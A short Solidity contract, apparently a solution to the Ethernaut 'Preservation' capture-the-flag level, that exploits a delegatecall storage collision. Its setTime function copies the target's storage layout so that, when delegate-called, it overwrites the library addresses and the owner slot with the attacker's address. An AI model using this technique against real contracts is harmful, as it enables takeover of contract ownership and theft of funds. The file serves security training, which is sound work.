// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "../interfaces/reentrance.sol";
// import "../interfaces/elevator.sol";

/**
 * this contract will be delegate-called instead of the original library lib1 defined in preservation
 * it will force the owner value to the address of the attacker (msg.sender of this contrat)
 */
contract preservationAttack {

    // same variables as in the original library
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

// attack function with same signature as original library, will be executed in the context of the target contract
  function setTime(uint _timeStamp) public {

    timeZone1Library=msg.sender;
    timeZone2Library=msg.sender;
    owner=msg.sender;

  }
}
